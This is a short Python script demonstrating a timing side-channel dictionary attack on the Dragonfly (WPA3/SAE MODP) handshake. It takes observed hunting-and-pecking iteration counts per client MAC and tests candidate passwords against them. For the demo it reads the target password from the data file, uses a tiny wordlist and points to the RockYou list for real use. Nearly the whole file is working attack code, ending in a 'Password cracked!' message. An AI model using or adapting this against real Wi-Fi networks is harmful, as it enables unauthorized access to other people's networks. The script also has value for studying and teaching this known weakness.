# File: bruteforce_attack.py
import csv
from dragonfly_modp import generate_password_element

# Load observed timing data (iterations) from previous simulation or attacker measurements
observed_data_file = "timing_results.csv"  # expecting columns: password (unknown to attacker), client_mac, iterations, time_us
# For this demo, we assume we know the client MACs used and the iterations observed.
# In practice, the attacker records the time and infers iterations from it.
observations = []  # will hold tuples of (client_mac, observed_iterations)
with open(observed_data_file, 'r') as f:
    reader = csv.DictReader(f)
    # Assume the attacker knows which data corresponds to the target network's password (filter by some marker or taken from one network)
    # For demo, pick the first password's entries as the "target".
    rows = list(reader)
    target_password = rows[0]["password"]  # (In reality attacker doesn't know this)
    observations = [(row["client_mac"], int(row["iterations"])) for row in rows if row["password"] == target_password]

print(f"Attacker collected timing info for {len(observations)} attempts on target network.")

# Load candidate password list (e.g., RockYou wordlist) - here we use a small sample for demonstration
candidate_passwords = ["password", "12345678", "password123", "letmein", "dragonfly", "hello12345", "guestwifi"]
# In a real scenario, load a large dictionary file:
# with open('rockyou.txt', 'r', errors='ignore') as f:
#     candidate_passwords = [w.strip() for w in f]

ap_mac = "AA:BB:CC:DD:EE:FF"  # assumed known AP MAC (used in observations)
possible_matches = []

for pwd in candidate_passwords:
    # Simulate the AP's behavior for each observed client MAC with this candidate password
    match = True
    for client_mac, obs_iter in observations:
        iter_count, _ = generate_password_element(pwd, client_mac, ap_mac)
        if iter_count != obs_iter:
            match = False
            break
    if match:
        possible_matches.append(pwd)

if possible_matches:
    print("Potential passwords matching timing signature:", possible_matches)
    if len(possible_matches) == 1:
        print(f"**Password cracked!:** '{possible_matches[0]}' is the likely network password.")
else:
    print("No candidates matched the observed timing signature.")
